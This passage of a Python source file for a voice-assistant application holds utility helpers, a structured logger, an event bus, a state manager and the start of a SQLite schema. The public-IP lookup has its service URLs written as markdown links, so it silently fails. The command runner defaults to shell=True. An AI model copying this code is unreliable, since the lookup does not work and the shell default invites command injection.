    return total_seconds if found else None


def sanitize_filename(filename: str) -> str:
    """Sanitize filename for safe filesystem use"""
    # Remove invalid characters
    invalid_chars = '<>:"/\\|?*'
    for char in invalid_chars:
        filename = filename.replace(char, '_')
    
    # Remove control characters
    filename = ''.join(c for c in filename if ord(c) >= 32)
    
    # Trim whitespace and dots
    filename = filename.strip('. ')
    
    # Ensure not empty
    if not filename:
        filename = 'unnamed'
    
    # Limit length
    name, ext = os.path.splitext(filename)
    if len(name) > 200:
        name = name[:200]
    
    return name + ext


def is_port_open(host: str, port: int, timeout: float = 1.0) -> bool:
    """Check if port is open on host"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def get_local_ip() -> str:
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_public_ip() -> Optional[str]:
    """Get public IP address"""
    services = [
        "[api.ipify.org](https://api.ipify.org)",
        "[icanhazip.com](https://icanhazip.com)",
        "[ifconfig.me](https://ifconfig.me/ip)",
    ]
    
    for service in services:
        try:
            req = urllib.request.Request(service, headers={"User-Agent": USER_AGENT})
            with urllib.request.urlopen(req, timeout=5) as response:
                return response.read().decode().strip()
        except Exception:
            continue
    
    return None


def resolve_hostname(hostname: str) -> Optional[str]:
    """Resolve hostname to IP address"""
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return None


def reverse_dns(ip: str) -> Optional[str]:
    """Reverse DNS lookup"""
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
        return None


def run_command(cmd: Union[str, List[str]], timeout: int = 30, 
                shell: bool = True, capture: bool = True) -> Tuple[int, str, str]:
    """Run shell command and return (returncode, stdout, stderr)"""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=capture,
            text=True,
            timeout=timeout,
            encoding='utf-8',
            errors='replace'
        )
        return result.returncode, result.stdout or "", result.stderr or ""
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", str(e)


def cleanup_old_files(directory: str, max_age_days: int = 7, pattern: str = "*"):
    """Delete files older than max_age_days"""
    cutoff = time.time() - (max_age_days * 86400)
    deleted = 0
    
    for path in Path(directory).glob(pattern):
        try:
            if path.is_file() and path.stat().st_mtime < cutoff:
                path.unlink()
                deleted += 1
        except Exception as _e:
            pass  # suppressed error
    
    return deleted


# ==============================================================================
# CONTEXT MANAGERS
# ==============================================================================

@contextmanager
def timer_context(name: str = "Operation"):
    """Context manager for timing operations"""
    start = time.perf_counter()
    try:
        yield
    finally:
        elapsed = time.perf_counter() - start
        print(f"[TIMER] {name}: {elapsed:.3f}s")


@contextmanager
def suppress_output():
    """Suppress stdout and stderr"""
    with open(os.devnull, 'w') as devnull:
        old_stdout = sys.stdout
        old_stderr = sys.stderr
        try:
            sys.stdout = devnull
            sys.stderr = devnull
            yield
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr


@contextmanager
def temp_directory():
    """Create temporary directory that is cleaned up after use"""
    temp_dir = tempfile.mkdtemp(dir=str(TEMP_DIR))
    try:
        yield temp_dir
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


@contextmanager
def atomic_write(path: str, mode: str = 'w', encoding: str = 'utf-8'):
    """Atomic file write using temporary file"""
    temp_path = f"{path}.tmp.{uuid.uuid4().hex[:8]}"
    try:
        with open(temp_path, mode, encoding=encoding) as f:
            yield f
        os.replace(temp_path, path)
    except Exception:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise


@contextmanager
def change_directory(path: str):
    """Temporarily change working directory"""
    old_cwd = os.getcwd()
    try:
        os.chdir(path)
        yield
    finally:
        os.chdir(old_cwd)


print("[✓] Utility classes, decorators, and helpers loaded")

# ==============================================================================
# PARTE 3: ADVANCED LOGGING, EVENT SYSTEM, AND STATE MANAGEMENT
# ==============================================================================

# ==============================================================================
# ADVANCED LOGGER WITH ROTATION AND STRUCTURED LOGGING
# ==============================================================================

class StructuredLogger:
    """
    Advanced logging system with:
    - File rotation
    - Multiple output handlers
    - Structured JSON logging
    - In-memory buffer for fast search
    - Color-coded console output
    - Log level filtering
    - Log aggregation and statistics
    """
    
    COLORS = {
        LogLevel.TRACE: "\033[37m",
        LogLevel.DEBUG: "\033[36m",
        LogLevel.INFO: "\033[37m",
        LogLevel.SUCCESS: "\033[32m",
        LogLevel.WARNING: "\033[33m",
        LogLevel.ERROR: "\033[31m",
        LogLevel.CRITICAL: "\033[91m",
    }
    RESET = "\033[0m"
    BOLD = "\033[1m"
    
    LEVEL_NAMES = {
        LogLevel.TRACE: "TRACE",
        LogLevel.DEBUG: "DEBUG",
        LogLevel.INFO: "INFO",
        LogLevel.SUCCESS: "SUCCESS",
        LogLevel.WARNING: "WARNING",
        LogLevel.ERROR: "ERROR",
        LogLevel.CRITICAL: "CRITICAL",
    }
    
    def __init__(self, 
                 name: str = "FRANCO",
                 log_file: Path = LOG_FILE,
                 max_file_size: int = 10 * 1024 * 1024,
                 backup_count: int = 5,
                 buffer_size: int = 1000,
                 min_level: LogLevel = LogLevel.INFO,
                 console_output: bool = True,
                 file_output: bool = True,
                 json_output: bool = False):
        
        self.name = name
        self.log_file = log_file
        self.max_file_size = max_file_size
        self.backup_count = backup_count
        self.min_level = min_level
        self.console_output = console_output
        self.file_output = file_output
        self.json_output = json_output
        
        self._buffer = deque(maxlen=buffer_size)
        self._lock = threading.RLock()
        self._stats = defaultdict(int)
        self._start_time = datetime.now()
        self._handlers: List[Callable] = []
        self._subscribers: List[Callable] = []
        
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        self._setup_file_rotation()
        self.info("LOGGER", f"Structured logger initialized: {name}")
    
    def _setup_file_rotation(self):
        if self.log_file.exists() and self.log_file.stat().st_size > self.max_file_size:
            self._rotate_logs()
    
    def _rotate_logs(self):
        try:
            for i in range(self.backup_count - 1, 0, -1):
                src = self.log_file.with_suffix(f".log.{i}")
                dst = self.log_file.with_suffix(f".log.{i + 1}")
                if src.exists():
                    if i == self.backup_count - 1:
                        src.unlink()
                    else:
                        src.rename(dst)
            
            if self.log_file.exists():
                self.log_file.rename(self.log_file.with_suffix(".log.1"))
        except Exception as e:
            print(f"[LOGGER] Rotation error: {e}")
    
    def _format_console(self, level: LogLevel, tag: str, message: str, 
                       timestamp: datetime) -> str:
        color = self.COLORS.get(level, "")
        level_name = self.LEVEL_NAMES.get(level, "UNKNOWN")
        ts = timestamp.strftime("%H:%M:%S.%f")[:-3]
        return f"{color}[{ts}] [{level_name:8s}] [{tag:12s}] {message}{self.RESET}"
    
    def _format_file(self, level: LogLevel, tag: str, message: str,
                    timestamp: datetime, extra: Dict = None) -> str:
        level_name = self.LEVEL_NAMES.get(level, "UNKNOWN")
        ts = timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        
        if self.json_output:
            data = {
                "timestamp": ts,
                "level": level_name,
                "tag": tag,
                "message": message,
                "logger": self.name,
            }
            if extra:
                data["extra"] = extra
            return json.dumps(data, ensure_ascii=False)
        else:
            base = f"[{ts}] [{level_name}] [{tag}] {message}"
            if extra:
                base += f" | {json.dumps(extra, ensure_ascii=False)}"
            return base
    
    def log(self, level: LogLevel, tag: str, message: str, extra: Dict = None):
        if level < self.min_level:
            return
        
        timestamp = datetime.now()
        entry = {
            "timestamp": timestamp,
            "level": level,
            "level_name": self.LEVEL_NAMES.get(level, "UNKNOWN"),
            "tag": tag,
            "message": message,
            "extra": extra or {},
        }
        
        with self._lock:
            self._buffer.append(entry)
            self._stats["total"] += 1
            self._stats[f"level_{self.LEVEL_NAMES.get(level, 'unknown').lower()}"] += 1
            self._stats[f"tag_{tag}"] += 1
            
            if self.console_output:
                formatted = self._format_console(level, tag, message, timestamp)
                print(formatted)
            
            if self.file_output:
                try:
                    if self.log_file.exists() and self.log_file.stat().st_size > self.max_file_size:
                        self._rotate_logs()
                    
                    formatted = self._format_file(level, tag, message, timestamp, extra)
                    with open(self.log_file, "a", encoding="utf-8") as f:
                        f.write(formatted + "\n")
                except Exception as e:
                    print(f"[LOGGER] File write error: {e}")
            
            for subscriber in self._subscribers:
                try:
                    subscriber(entry)
                except Exception as _e:
                    pass  # suppressed error
            
            for handler in self._handlers:
                try:
                    handler(entry)
                except Exception as _e:
                    pass  # suppressed error
    
    def trace(self, tag: str, message: str, **kwargs):
        self.log(LogLevel.TRACE, tag, message, kwargs if kwargs else None)
    
    def debug(self, tag: str, message: str, **kwargs):
        self.log(LogLevel.DEBUG, tag, message, kwargs if kwargs else None)
    
    def info(self, tag: str, message: str, **kwargs):
        self.log(LogLevel.INFO, tag, message, kwargs if kwargs else None)
    
    def success(self, tag: str, message: str, **kwargs):
        self.log(LogLevel.SUCCESS, tag, message, kwargs if kwargs else None)
    
    def warning(self, tag: str, message: str, **kwargs):
        self.log(LogLevel.WARNING, tag, message, kwargs if kwargs else None)
    
    def error(self, tag: str, message: str, **kwargs):
        self.log(LogLevel.ERROR, tag, message, kwargs if kwargs else None)
    
    def critical(self, tag: str, message: str, **kwargs):
        self.log(LogLevel.CRITICAL, tag, message, kwargs if kwargs else None)
    
    def exception(self, tag: str, message: str, exc: Exception = None):
        exc_info = traceback.format_exc() if exc else ""
        full_message = f"{message}\n{exc_info}" if exc_info else message
        self.log(LogLevel.ERROR, tag, full_message)
    
    def search(self, query: str, limit: int = 50, 
              level: Optional[LogLevel] = None,
              tag: Optional[str] = None,
              start_time: Optional[datetime] = None,
              end_time: Optional[datetime] = None) -> List[Dict]:
        query_lower = query.lower()
        results = []
        
        with self._lock:
            entries = list(self._buffer)
        
        for entry in reversed(entries):
            if level is not None and entry["level"] != level:
                continue
            if tag is not None and entry["tag"] != tag:
                continue
            if start_time and entry["timestamp"] < start_time:
                continue
            if end_time and entry["timestamp"] > end_time:
                continue
            
            if query_lower:
                searchable = (
                    f"{entry['tag'].lower()} "
                    f"{entry['message'].lower()} "
                    f"{json.dumps(entry.get('extra', {}), ensure_ascii=False).lower()}"
                )
                if query_lower not in searchable:
                    continue
            
            results.append(entry)
            
            if len(results) >= limit:
                break
        
        return results
    
    def get_recent(self, n: int = 20, level: Optional[LogLevel] = None,
                  tag: Optional[str] = None) -> List[Dict]:
        with self._lock:
            entries = list(self._buffer)
        
        if level is not None:
            entries = [e for e in entries if e["level"] >= level]
        
        if tag is not None:
            entries = [e for e in entries if e["tag"] == tag]
        
        return entries[-n:]
    
    def get_statistics(self) -> Dict:
        with self._lock:
            uptime = (datetime.now() - self._start_time).total_seconds()
            return {
                "total_logs": self._stats["total"],
                "uptime_seconds": uptime,
                "logs_per_minute": (self._stats["total"] / uptime * 60) if uptime > 0 else 0,
                "by_level": {
                    name: self._stats.get(f"level_{name.lower()}", 0)
                    for name in self.LEVEL_NAMES.values()
                },
                "buffer_size": len(self._buffer),
                "buffer_max": self._buffer.maxlen,
                "log_file": str(self.log_file),
                "log_file_size": self.log_file.stat().st_size if self.log_file.exists() else 0,
            }
    
    def export_logs(self, output_path: str, format: str = "json",
                   filters: Dict = None) -> bool:
        try:
            with self._lock:
                entries = list(self._buffer)
            
            if filters:
                if "level" in filters:
                    entries = [e for e in entries if e["level"] >= filters["level"]]
                if "tag" in filters:
                    entries = [e for e in entries if e["tag"] == filters["tag"]]
                if "start_time" in filters:
                    entries = [e for e in entries if e["timestamp"] >= filters["start_time"]]
                if "end_time" in filters:
                    entries = [e for e in entries if e["timestamp"] <= filters["end_time"]]
            
            for entry in entries:
                if isinstance(entry.get("timestamp"), datetime):
                    entry["timestamp"] = entry["timestamp"].isoformat()
                if isinstance(entry.get("level"), LogLevel):
                    entry["level"] = entry["level"].value
            
            if format == "json":
                with open(output_path, "w", encoding="utf-8") as f:
                    json.dump(entries, f, indent=2, ensure_ascii=False, default=str)
            elif format == "csv":
                with open(output_path, "w", encoding="utf-8", newline="") as f:
                    if entries:
                        writer = csv.DictWriter(f, fieldnames=entries[0].keys())
                        writer.writeheader()
                        writer.writerows(entries)
            elif format == "text":
                with open(output_path, "w", encoding="utf-8") as f:
                    for entry in entries:
                        line = (f"[{entry['timestamp']}] "
                               f"[{entry.get('level_name', 'INFO')}] "
                               f"[{entry['tag']}] {entry['message']}\n")
                        f.write(line)
            else:
                return False
            
            return True
        except Exception as e:
            self.error("LOGGER", f"Export failed: {e}")
            return False
    
    def subscribe(self, callback: Callable):
        with self._lock:
            self._subscribers.append(callback)
    
    def unsubscribe(self, callback: Callable):
        with self._lock:
            if callback in self._subscribers:
                self._subscribers.remove(callback)
    
    def add_handler(self, handler: Callable):
        with self._lock:
            self._handlers.append(handler)
    
    def clear_buffer(self):
        with self._lock:
            self._buffer.clear()
    
    def set_level(self, level: LogLevel):
        with self._lock:
            self.min_level = level


# ==============================================================================
# EVENT SYSTEM (PUB/SUB PATTERN)
# ==============================================================================

class EventBus:
    """
    Event bus for pub/sub pattern.
    Allows decoupled communication between system components.
    Supports wildcards, priorities, and async callbacks.
    """
    
    def __init__(self):
        self._subscribers: Dict[str, List[Tuple[Callable, Priority]]] = defaultdict(list)
        self._async_subscribers: Dict[str, List[Callable]] = defaultdict(list)
        self._lock = threading.RLock()
        self._event_history = deque(maxlen=500)
        self._wildcards: List[Tuple[str, Callable, Priority]] = []
        self._stats = defaultdict(int)
        self._middleware: List[Callable] = []
    
    def subscribe(self, event_type: str, callback: Callable,
                 priority: Priority = Priority.NORMAL):
        """
        Subscribe to an event type.
        Supports wildcard patterns with '*' (e.g., "system.*")
        """
        with self._lock:
            if '*' in event_type:
                self._wildcards.append((event_type, callback, priority))
                self._wildcards.sort(key=lambda x: x[2], reverse=True)
            else:
                self._subscribers[event_type].append((callback, priority))
                self._subscribers[event_type].sort(key=lambda x: x[1], reverse=True)
    
    def subscribe_async(self, event_type: str, callback: Callable):
        with self._lock:
            self._async_subscribers[event_type].append(callback)
    
    def unsubscribe(self, event_type: str, callback: Callable):
        with self._lock:
            if event_type in self._subscribers:
                self._subscribers[event_type] = [
                    (cb, p) for cb, p in self._subscribers[event_type]
                    if cb != callback
                ]
            self._async_subscribers[event_type] = [
                cb for cb in self._async_subscribers.get(event_type, []) if cb != callback
            ]
            # Also check wildcards
            self._wildcards = [
                (pat, cb, p) for pat, cb, p in self._wildcards
                if not (pat == event_type and cb == callback)
            ]
    
    def add_middleware(self, middleware: Callable):
        """Add middleware that processes all events before dispatch"""
        with self._lock:
            self._middleware.append(middleware)
    
    def emit(self, event_type: str, data: Any = None, source: str = "system",
            priority: Priority = Priority.NORMAL, metadata: Dict = None):
        """Emit an event synchronously"""
        event = EventData(
            event_type=event_type,
            data=data,
            source=source,
            priority=priority,
            metadata=metadata or {}
        )
        
        # Apply middleware
        with self._lock:
            middleware = list(self._middleware)
        
        for mw in middleware:
            try:
                event = mw(event) or event
            except Exception as e:
                print(f"[EVENT] Middleware error: {e}")
        
        with self._lock:
            self._event_history.append(event)
            self._stats[event_type] += 1
            
            subscribers = list(self._subscribers.get(event_type, []))
            
            for pattern, callback, prio in self._wildcards:
                if self._matches_pattern(event_type, pattern):
                    subscribers.append((callback, prio))
            
            subscribers.sort(key=lambda x: x[1], reverse=True)
        
        for callback, _ in subscribers:
            try:
                callback(event)
            except Exception as e:
                print(f"[EVENT] Subscriber error for {event_type}: {e}")
    
    async def emit_async(self, event_type: str, data: Any = None,
                        source: str = "system",
                        metadata: Dict = None):
        event = EventData(
            event_type=event_type,
            data=data,
            source=source,
            metadata=metadata or {}
        )
        
        with self._lock:
            subscribers = list(self._async_subscribers.get(event_type, []))
        
        tasks = []
        for callback in subscribers:
            if asyncio.iscoroutinefunction(callback):
                tasks.append(asyncio.create_task(callback(event)))
            else:
                tasks.append(asyncio.create_task(asyncio.to_thread(callback, event)))
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def _matches_pattern(self, event_type: str, pattern: str) -> bool:
        if pattern == "*":
            return True
        regex_pattern = pattern.replace(".", r"\.").replace("*", ".*")
        return bool(re.fullmatch(regex_pattern, event_type))
    
    def get_history(self, event_type: Optional[str] = None,
                   limit: int = 50) -> List[EventData]:
        with self._lock:
            events = list(self._event_history)
        
        if event_type:
            events = [e for e in events if e.event_type == event_type]
        
        return events[-limit:]
    
    def get_statistics(self) -> Dict:
        with self._lock:
            return {
                "total_events": sum(self._stats.values()),
                "by_type": dict(self._stats),
                "subscriber_count": sum(len(s) for s in self._subscribers.values()),
                "wildcard_count": len(self._wildcards),
                "history_size": len(self._event_history),
            }
    
    def clear_history(self):
        with self._lock:
            self._event_history.clear()
    
    def wait_for_event(self, event_type: str, timeout: float = None) -> Optional[EventData]:
        """Block until an event occurs (or timeout)"""
        result_holder = [None]
        event_received = threading.Event()
        
        def handler(event: EventData):
            result_holder[0] = event
            event_received.set()
        
        self.subscribe(event_type, handler, Priority.HIGHEST)
        try:
            if event_received.wait(timeout=timeout):
                return result_holder[0]
            return None
        finally:
            self.unsubscribe(event_type, handler)


# ==============================================================================
# THREAD-SAFE STATE MANAGEMENT
# ==============================================================================

class StateManager:
    """
    Thread-safe state manager with:
    - Atomic state updates
    - Change notifications
    - State history
    - Snapshot/restore
    - Computed properties
    - Validators
    - Persistence
    """
    
    def __init__(self, event_bus: Optional[EventBus] = None,
                 persist_path: Optional[Path] = None):
        self._state: Dict[str, Any] = {}
        self._lock = threading.RLock()
        self._history = deque(maxlen=100)
        self._observers: Dict[str, List[Callable]] = defaultdict(list)
        self._computed: Dict[str, Tuple[Callable, List[str]]] = {}
        self._validators: Dict[str, Callable] = {}
        self._persistent_keys: Set[str] = set()
        self._event_bus = event_bus
        self._persist_path = persist_path
        
        self._initialize_default_state()
        
        if persist_path and persist_path.exists():
            self._load_persistent_state()
    
    def _initialize_default_state(self):
        """Initialize with default values"""
        defaults = {
            # System state
            "system_state": SystemState.INITIALIZING,
            "running": True,
            "initialized": False,
            "boot_time": datetime.now(),
            
            # Voice state
            "listening": False,
            "speaking": False,
            "thinking": False,
            "active": False,
            "standby": False,
            "interrupted": False,
            "conversation_until": 0.0,
            
            # User state
            "user_name": "Signore",
            "user_authenticated": False,
            "security_level": SecurityLevel.BASIC,
            "session_id": generate_id("sess_", 12),
            
            # Audio state
            "volume": 0.9,
            "mic_level": 0.0,
            "noise_floor": 100.0,
            "voice_active": False,
            "voice_enabled": True,
            "speech_muted": False,
            "mic_status": "starting",
            "mic_device_name": "Rilevamento...",
            "mic_device_index": None,
            "mic_devices": [],
            "mic_error": "",
            "voice_capture": {"active": False},
            "tts_voice": "xtts",
            "tts_rate": "+5%",
            "tts_pitch": "-2Hz",
            
            # UI state
            "active_theme": "nexus",
            "focus_mode": False,
            "presenter_mode": False,
            "fullscreen": False,
            "ui_fps": 60,
            
            # AI state
            "mood": MoodType.NEUTRAL,
            "context_size": 0,
            "ai_model": "claude-sonnet-4-5",
            "ai_temperature": 1.0,
            "conversation_id": generate_id("conv_", 10),
            
            # Recording state
            "recording_macro": False,
            "current_macro": [],
            "macro_name": "",
            
            # Network state
            "network_connected": True,
            "local_ip": "",
            "public_ip": "",
            "vpn_active": False,
            
            # Performance state
            "cpu_percent": 0.0,
            "memory_percent": 0.0,
            "disk_percent": 0.0,
            "network_sent_mb": 0.0,
            "network_recv_mb": 0.0,
            "last_command_time": time.time(),
            "last_interrupt": 0,
            "last_voice_input": 0,
            
            # Error state
            "last_error": "",
            "error_count": 0,
            "critical_errors": [],
            
            # Statistics
            "session_start": datetime.now(),
            "commands_executed": 0,
            "ai_queries": 0,
            "voice_interactions": 0,
            "uptime_seconds": 0,
        }
        
        with self._lock:
            self._state.update(defaults)
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get state value (supports dot notation for nested keys)"""
        with self._lock:
            # Check computed properties first
            if key in self._computed:
                func, deps = self._computed[key]
                deps_values = {d: self._state.get(d) for d in deps}
                try:
                    return func(deps_values)
                except Exception:
                    return default
            
            # Support dot notation
            if '.' in key:
                parts = key.split('.')
                current = self._state
                for part in parts:
                    if isinstance(current, dict) and part in current:
                        current = current[part]
                    else:
                        return default
                return current
            
            return self._state.get(key, default)
    
    def set(self, key: str, value: Any, notify: bool = True) -> bool:
        """Set state value with validation"""
        with self._lock:
            # Validate
            if key in self._validators:
                if not self._validators[key](value):
                    return False
            
            old_value = self._state.get(key)
            self._state[key] = value
            
            # Add to history
            self._history.append({
                "timestamp": datetime.now(),
                "key": key,
                "old_value": old_value,
                "new_value": value,
            })
            
            # Persist if needed
            if key in self._persistent_keys:
                self._save_persistent_state()
        
        if notify and old_value != value:
            self._notify(key, old_value, value)
        
        return True
    
    def update(self, updates: Dict[str, Any], notify: bool = True):
        """Update multiple state values atomically"""
        notifications = []
        
        with self._lock:
            for key, value in updates.items():
                if key in self._validators:
                    if not self._validators[key](value):
                        continue
                
                old_value = self._state.get(key)
                self._state[key] = value
                
                if old_value != value:
                    notifications.append((key, old_value, value))
                
                self._history.append({
                    "timestamp": datetime.now(),
                    "key": key,
                    "old_value": old_value,
                    "new_value": value,
                })
            
            # Persist if any persistent keys were updated
            if any(k in self._persistent_keys for k in updates.keys()):
                self._save_persistent_state()
        
        if notify:
            for key, old, new in notifications:
                self._notify(key, old, new)
    
    def increment(self, key: str, amount: float = 1) -> Any:
        """Atomically increment a numeric value"""
        with self._lock:
            current = self._state.get(key, 0)
            new_value = current + amount
            self._state[key] = new_value
            return new_value
    
    def toggle(self, key: str) -> bool:
        """Atomically toggle a boolean value"""
        with self._lock:
            current = bool(self._state.get(key, False))
            new_value = not current
            self._state[key] = new_value
        
        self._notify(key, current, new_value)
        return new_value
    
    def _notify(self, key: str, old_value: Any, new_value: Any):
        with self._lock:
            observers = list(self._observers.get(key, []))
            wildcard_observers = list(self._observers.get("*", []))
        
        for observer in observers + wildcard_observers:
            try:
                observer(key, old_value, new_value)
            except Exception as e:
                print(f"[STATE] Observer error for {key}: {e}")
        
        if self._event_bus:
            self._event_bus.emit(
                f"state.changed.{key}",
                data={"old": old_value, "new": new_value},
                source="state_manager"
            )
    
    def observe(self, key: str, callback: Callable):
        """Subscribe to state changes for a key (or '*' for all)"""
        with self._lock:
            self._observers[key].append(callback)
    
    def unobserve(self, key: str, callback: Callable):
        with self._lock:
            if key in self._observers and callback in self._observers[key]:
                self._observers[key].remove(callback)
    
    def add_computed(self, key: str, func: Callable, dependencies: List[str]):
        """Add a computed property derived from other state values"""
        with self._lock:
            self._computed[key] = (func, dependencies)
    
    def add_validator(self, key: str, validator: Callable):
        with self._lock:
            self._validators[key] = validator
    
    def mark_persistent(self, *keys: str):
        """Mark keys as persistent (saved to disk)"""
        with self._lock:
            self._persistent_keys.update(keys)
    
    def _save_persistent_state(self):
        """Save persistent state to disk"""
        if not self._persist_path:
            return
        
        try:
            data = {k: self._state.get(k) for k in self._persistent_keys}
            # Convert non-serializable types
            for k, v in data.items():
                if isinstance(v, datetime):
                    data[k] = v.isoformat()
                elif isinstance(v, Enum):
                    data[k] = v.value
            
            with atomic_write(str(self._persist_path)) as f:
                json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        except Exception as e:
            print(f"[STATE] Persist save error: {e}")
    
    def _load_persistent_state(self):
        """Load persistent state from disk"""
        if not self._persist_path or not self._persist_path.exists():
            return
        
        try:
            with open(self._persist_path, "r", encoding="utf-8") as f:
                data = json.load(f)
            
            with self._lock:
                for key, value in data.items():
                    self._state[key] = value
                    self._persistent_keys.add(key)
        except Exception as e:
            print(f"[STATE] Persist load error: {e}")
    
    def snapshot(self) -> Dict:
        """Take a snapshot of current state"""
        with self._lock:
            return copy.deepcopy(self._state)
    
    def restore(self, snapshot: Dict, notify: bool = True):
        """Restore state from snapshot"""
        with self._lock:
            old_state = self._state.copy()
            self._state = copy.deepcopy(snapshot)
        
        if notify:
            for key, value in self._state.items():
                if key in old_state and old_state[key] != value:
                    self._notify(key, old_state[key], value)
    
    def get_history(self, key: Optional[str] = None,
                   limit: int = 50) -> List[Dict]:
        with self._lock:
            history = list(self._history)
        
        if key:
            history = [h for h in history if h["key"] == key]
        
        return history[-limit:]
    
    def reset(self, keys: Optional[List[str]] = None):
        """Reset state to defaults"""
        if keys is None:
            self._initialize_default_state()
        else:
            temp_state = {}
            old_state = self._state.copy()
            self._state = temp_state
            self._initialize_default_state()
            new_defaults = self._state.copy()
            self._state = old_state
            
            with self._lock:
                for key in keys:
                    if key in new_defaults:
                        self._state[key] = new_defaults[key]
    
    def export_state(self, path: str) -> bool:
        """Export entire state to file"""
        try:
            snapshot = self.snapshot()
            for k, v in list(snapshot.items()):
                if isinstance(v, datetime):
                    snapshot[k] = v.isoformat()
                elif isinstance(v, Enum):
                    snapshot[k] = v.value
            
            with open(path, "w", encoding="utf-8") as f:
                json.dump(snapshot, f, indent=2, ensure_ascii=False, default=str)
            return True
        except Exception:
            return False
    
    def get_all(self) -> Dict:
        """Get entire state (read-only copy)"""
        with self._lock:
            return self._state.copy()


                    # ==============================================================================
# PARTE 4: DATABASE, CACHE, CONFIG, MEMORY, CRYPTO VAULT
# ==============================================================================

# ==============================================================================
# CACHE MANAGER
# ==============================================================================

from .core.cache import CacheManager


# ==============================================================================
# DATABASE MANAGER (SQLITE)
# ==============================================================================

class DatabaseManager:
    """
    Gestore database SQLite con:
    - Connection pooling thread-local
    - WAL mode per concorrenza
    - Schema migration automatica
    - Backup integrato
    - Query builder helpers
    """
    
    SCHEMA_VERSION = 1
    
    def __init__(self, db_path: Path = MAIN_DATABASE):
        self.db_path = db_path
        self._lock = threading.RLock()
        self._local = threading.local()
        
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self._initialize_schema()
    
    def _get_connection(self) -> sqlite3.Connection:
        """Thread-local connection per evitare contention"""
        if not hasattr(self._local, 'conn'):
            self._local.conn = sqlite3.connect(
                str(self.db_path),
                check_same_thread=False,
                timeout=30.0,
                isolation_level=None
            )
            self._local.conn.row_factory = sqlite3.Row
            self._local.conn.execute("PRAGMA journal_mode=WAL")
            self._local.conn.execute("PRAGMA foreign_keys=ON")
            self._local.conn.execute("PRAGMA synchronous=NORMAL")
            self._local.conn.execute("PRAGMA cache_size=-64000")
        return self._local.conn
    
    def _initialize_schema(self):
        """Create all required tables"""
        with self._lock:
            conn = self._get_connection()
            cur = conn.cursor()
            
            # Metadata table per versioning schema
            cur.execute("""
                CREATE TABLE IF NOT EXISTS metadata (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            """)
            
            # Conversations
            cur.execute("""
                CREATE TABLE IF NOT EXISTS conversations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    conversation_id TEXT NOT NULL,
                    role TEXT NOT NULL,
                    content TEXT NOT NULL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    mood TEXT,
                    tokens INTEGER DEFAULT 0,
                    metadata TEXT
                )
            """)
            cur.execute("CREATE INDEX IF NOT EXISTS idx_conv_id ON conversations(conversation_id)")
            cur.execute("CREATE INDEX IF NOT EXISTS idx_conv_ts ON conversations(timestamp)")
            
            # Commands history
            cur.execute("""
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    command TEXT NOT NULL,
                    response TEXT,
                    category TEXT,
                    success INTEGER,
                    execution_time REAL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            cur.execute("CREATE INDEX IF NOT EXISTS idx_cmd_ts ON commands(timestamp)")
            cur.execute("CREATE INDEX IF NOT EXISTS idx_cmd_cat ON commands(category)")
            
            # Notes
            cur.execute("""
                CREATE TABLE IF NOT EXISTS notes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    title TEXT,
                    content TEXT NOT NULL,
                    category TEXT,
                    tags TEXT,
                    created DATETIME DEFAULT CURRENT_TIMESTAMP,
                    modified DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Reminders
            cur.execute("""
                CREATE TABLE IF NOT EXISTS reminders (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    title TEXT NOT NULL,
                    description TEXT,
                    due_date DATETIME,
                    priority INTEGER DEFAULT 3,
                    completed INTEGER DEFAULT 0,
                    completed_at DATETIME,
                    created DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            cur.execute("CREATE INDEX IF NOT EXISTS idx_rem_due ON reminders(due_date)")
            
            # Contacts
            cur.execute("""
                CREATE TABLE IF NOT EXISTS contacts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL UNIQUE,
                    email TEXT,
                    phone TEXT,
                    address TEXT,
                    company TEXT,
                    notes TEXT,
                    created DATETIME DEFAULT CURRENT_TIMESTAMP,
                    updated DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Network scans
            cur.execute("""
                CREATE TABLE IF NOT EXISTS network_scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    scan_type TEXT NOT NULL,
                    target TEXT NOT NULL,
                    results TEXT,
                    duration REAL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            cur.execute("CREATE INDEX IF NOT EXISTS idx_scan_target ON network_scans(target)")
            
            # Security events
            cur.execute("""
                CREATE TABLE IF NOT EXISTS security_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    event_type TEXT NOT NULL,
                    severity TEXT NOT NULL,
                    source TEXT,
                    description TEXT,
                    metadata TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            cur.execute("CREATE INDEX IF NOT EXISTS idx_sec_sev ON security_events(severity)")
